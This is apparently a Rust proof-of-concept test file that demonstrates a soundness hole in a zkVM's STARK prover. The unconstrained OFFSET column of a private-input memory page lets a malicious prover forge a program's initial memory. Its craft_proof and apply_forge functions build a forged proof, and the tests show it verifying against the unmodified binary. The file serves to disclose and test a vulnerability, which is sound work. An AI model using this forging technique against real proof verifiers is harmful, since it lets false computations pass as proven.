//! PoC: a private-input PAGE's `OFFSET` column is a free, unconstrained
//! main-trace column, so a malicious prover can point one of its rows at an
//! arbitrary address and forge that address's initial memory contents.
//!
//! `create_page_air` builds PAGE with `EmptyConstraints`, and `VmAirs::new`
//! skips `with_preprocessed` for `is_private_input` pages — so for those pages
//! nothing pins `OFFSET` to the row index. The Memory-bus address is
//! `address_lo = page_base_lo + OFFSET`, hence any `address_lo` is reachable.
//!
//! The guest here loads 8 bytes out of its own ELF `.data`, spills them to the
//! stack and commits them, so the proof's `public_output` is a direct function
//! of the ELF image — which the verifier binds via that data page's
//! preprocessed commitment. The forged proof still verifies against the
//! *unmodified* ELF while claiming a different output.

use crypto::fiat_shamir::default_transcript::DefaultTranscript;
use math::field::element::FieldElement;
use stark::proof::options::ProofOptions;
use stark::prover::{IsStarkProver, Prover};

use crate::statement::{StatementKind, absorb_statement};
use crate::tables::bitwise::{cols as bw_cols, row_index as bw_row_index};
use crate::tables::page::cols as page_cols;
use crate::tables::trace_builder::Traces;
use crate::tables::types::{FE, VmTable};
use crate::test_utils::{E, asm_elf_bytes};
use crate::{MaxRowsConfig, VmAirs, VmProof};

use executor::elf::Elf;
use executor::vm::execution::Executor;
use executor::vm::memory::PRIVATE_INPUT_START_INDEX;

/// The 8 bytes the PoC guest keeps in `.data` (little-endian `.dword`).
const SECRET: [u8; 8] = [0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88];

/// The byte we forge in its place.
const FORGED_BYTE: u8 = 0xEE;

fn opts() -> ProofOptions {
    ProofOptions::default_test_options()
}

/// Raw-file offset of `SECRET` inside the ELF, plus the virtual address that
/// offset maps to (via the containing PT_LOAD program header).
fn locate_secret(elf_bytes: &[u8]) -> (usize, u64) {
    let file_off = elf_bytes
        .windows(SECRET.len())
        .position(|w| w == SECRET)
        .expect("SECRET pattern not found in ELF");

    let rd_u16 = |o: usize| u16::from_le_bytes(elf_bytes[o..o + 2].try_into().unwrap());
    let rd_u32 = |o: usize| u32::from_le_bytes(elf_bytes[o..o + 4].try_into().unwrap());
    let rd_u64 = |o: usize| u64::from_le_bytes(elf_bytes[o..o + 8].try_into().unwrap());

    let e_phoff = rd_u64(32) as usize;
    let e_phentsize = rd_u16(54) as usize;
    let e_phnum = rd_u16(56) as usize;
    const PT_LOAD: u32 = 1;

    for i in 0..e_phnum {
        let ph = e_phoff + i * e_phentsize;
        if rd_u32(ph) != PT_LOAD {
            continue;
        }
        let p_offset = rd_u64(ph + 8) as usize;
        let p_vaddr = rd_u64(ph + 16);
        let p_filesz = rd_u64(ph + 32) as usize;
        if file_off >= p_offset && file_off + SECRET.len() <= p_offset + p_filesz {
            return (file_off, p_vaddr + (file_off - p_offset) as u64);
        }
    }
    panic!("SECRET is not inside any PT_LOAD segment");
}

/// One repointed private-input PAGE row.
struct Forge {
    /// The address whose genesis byte we overwrite.
    target_addr: u64,
    /// The byte the forged init token carries.
    forged: u8,
    /// The byte the honest (preprocessed-bound) init token carries; the
    /// repointed row's PAGE-C4 consumes it so the bus still balances.
    real: u8,
}

/// A malicious prover. Everything is the production pipeline; the only
/// deviations are (a) the execution logs may come from a different ELF than
/// the one whose identity/preprocessed roots are used, and (b) `forge`
/// rewrites one private-input PAGE row.
fn craft_proof(
    honest_elf: &[u8],
    run_elf: &[u8],
    private_inputs: &[u8],
    forge: Option<Forge>,
) -> VmProof {
    let options = opts();

    // Identity + all preprocessed roots come from the HONEST ELF.
    let program = Elf::load(honest_elf).expect("honest ELF load");

    // Execution logs come from whatever `run_elf` is.
    let run_program = Elf::load(run_elf).expect("run ELF load");
    let executor =
        Executor::new(&run_program, private_inputs.to_vec()).expect("executor construction");
    let result = executor.run().expect("run");

    let max_rows = MaxRowsConfig::default();
    let mut traces = Traces::from_elf_and_logs(
        &program,
        &result.logs,
        &max_rows,
        private_inputs,
        #[cfg(feature = "disk-spill")]
        stark::storage_mode::StorageMode::Ram,
    )
    .expect("trace build");

    if let Some(f) = forge {
        apply_forge(&mut traces, &f);
    }

    let table_counts = traces.table_counts();
    let airs = VmAirs::new(
        &program,
        &options,
        false,
        &traces.page_configs,
        &table_counts,
        None,
        true,
        None,
        None,
        None,
    );

    let runtime_page_ranges = traces.runtime_page_ranges();
    let num_private_input_pages = traces
        .page_configs
        .iter()
        .filter(|c| c.is_private_input)
        .count();

    let mut transcript = DefaultTranscript::<E>::new(&[]);
    absorb_statement(
        &mut transcript,
        StatementKind::Monolithic,
        honest_elf,
        &traces.public_output_bytes,
        &table_counts,
        num_private_input_pages,
        &runtime_page_ranges,
        options.fri_final_poly_log_degree,
    );

    let proof = Prover::multi_prove(
        airs.air_trace_pairs(&mut traces),
        &mut transcript,
        #[cfg(feature = "disk-spill")]
        stark::storage_mode::StorageMode::Ram,
    )
    .expect("multi_prove");

    VmProof {
        proof,
        runtime_page_ranges,
        table_counts,
        public_output: traces.public_output_bytes.clone(),
        num_private_input_pages,
    }
}

/// Repoint one unused private-input PAGE row at `f.target_addr` so that it
/// PROVIDES `(0, target, ts=0, forged)` on the Memory bus and CONSUMES the
/// honest `(0, target, ts=0, real)` token in its place.
fn apply_forge(traces: &mut Traces, f: &Forge) {
    let (page_idx, page_base) = traces
        .page_configs
        .iter()
        .enumerate()
        .find(|(_, c)| c.is_private_input)
        .map(|(i, c)| (i, c.page_base))
        .expect("a private-input page must exist");

    assert_eq!(
        page_base >> 32,
        f.target_addr >> 32,
        "address_hi is a constant per page, so the target must share it"
    );

    // Any private-input byte the guest never reads. Row 4096 is well past the
    // 4-byte length prefix and the (tiny) input payload.
    let row = 4096usize;
    {
        let page = &traces.pages[page_idx].main_table;
        assert_eq!(*page.get(row, page_cols::INIT), FE::zero());
        assert_eq!(*page.get(row, page_cols::FINI), FE::zero());
        assert_eq!(*page.get(row, page_cols::TIMESTAMP_LO), FE::zero());
        assert_eq!(*page.get(row, page_cols::TIMESTAMP_HI), FE::zero());
        assert_eq!(*page.get(row, page_cols::OFFSET), FE::from(row as u64));
    }

    let page = &mut traces.pages[page_idx].main_table;
    // address_lo = page_base_lo + OFFSET  ⇒  OFFSET = target - page_base (in F_p).
    page.set(row, page_cols::OFFSET, FE::from(f.target_addr) - FE::from(page_base));
    page.set_byte(row, page_cols::INIT, f.forged);
    page.set_byte(row, page_cols::FINI, f.real);
    // TIMESTAMP stays 0: PAGE-C4 then consumes the honest genesis token, which
    // PAGE-C3 hardcodes at ts = 0.

    // The row's ARE_BYTES[init, fini] send moved from (0, 0) to (forged, real);
    // rebalance the BITWISE receiver multiplicities to match.
    let bw = &mut traces.bitwise.main_table;
    let dec = bw_row_index(0, 0, 0);
    let inc = bw_row_index(f.forged, f.real, 0);
    assert_ne!(dec, inc);
    let old_dec = *bw.get(dec, bw_cols::MU_ARE_BYTES);
    assert_ne!(old_dec, FE::zero(), "(0,0) must have spare multiplicity");
    bw.set(dec, bw_cols::MU_ARE_BYTES, old_dec - FE::one());
    let old_inc = *bw.get(inc, bw_cols::MU_ARE_BYTES);
    bw.set(inc, bw_cols::MU_ARE_BYTES, old_inc + FE::one());
}

// =============================================================================
// Tests
// =============================================================================

/// Sanity: the guest commits its own `.data` bytes, and the harness used
/// honestly produces a genuinely valid proof. Guards against a vacuous PoC.
#[test]
fn poc_control_honest_harness_verifies() {
    let elf = asm_elf_bytes("poc_rodata_commit");
    let proof = craft_proof(&elf, &elf, &[0u8], None);
    assert_eq!(
        proof.public_output,
        SECRET.to_vec(),
        "guest must commit its .data bytes"
    );
    assert!(
        crate::verify_with_options(&proof, &elf, &opts(), None, None).expect("verify"),
        "honest use of the harness must verify"
    );
    assert_eq!(
        proof.num_private_input_pages, 1,
        "one byte of private input must create exactly one private page"
    );
}

/// NEGATIVE CONTROL: run the patched program but do NOT repoint a PAGE row.
/// The genesis token the MEMW chain consumes at `secret` then has no provider
/// (the honest page provides the real byte), so the bus must not balance.
#[test]
fn poc_negative_control_forged_run_without_repointed_row_fails() {
    let honest = asm_elf_bytes("poc_rodata_commit");
    let (file_off, _addr) = locate_secret(&honest);
    let mut patched = honest.clone();
    patched[file_off] = FORGED_BYTE;

    let proof = craft_proof(&honest, &patched, &[0u8], None);
    assert_eq!(
        proof.public_output[0], FORGED_BYTE,
        "the patched run must commit the forged byte"
    );
    assert!(
        !crate::verify_with_options(&proof, &honest, &opts(), None, None).expect("verify"),
        "without the repointed PAGE row this proof must be rejected"
    );
}

/// THE BREAK: same forged execution, plus one repointed private-input PAGE
/// row. Verification against the UNMODIFIED ELF accepts a proof whose public
/// output the program cannot produce.
#[test]
fn poc_private_page_offset_forges_memory_contents() {
    let honest = asm_elf_bytes("poc_rodata_commit");
    let (file_off, addr) = locate_secret(&honest);
    let mut patched = honest.clone();
    patched[file_off] = FORGED_BYTE;

    let proof = craft_proof(
        &honest,
        &patched,
        &[0u8],
        Some(Forge {
            target_addr: addr,
            forged: FORGED_BYTE,
            real: SECRET[0],
        }),
    );

    assert_eq!(
        proof.public_output[0], FORGED_BYTE,
        "forged proof must claim the forged byte"
    );
    assert_ne!(proof.public_output, SECRET.to_vec());

    let accepted =
        crate::verify_with_options(&proof, &honest, &opts(), None, None).expect("verify");
    assert!(
        accepted,
        "SOUNDNESS HOLE NOT REPRODUCED: verifier rejected the forged proof"
    );
}
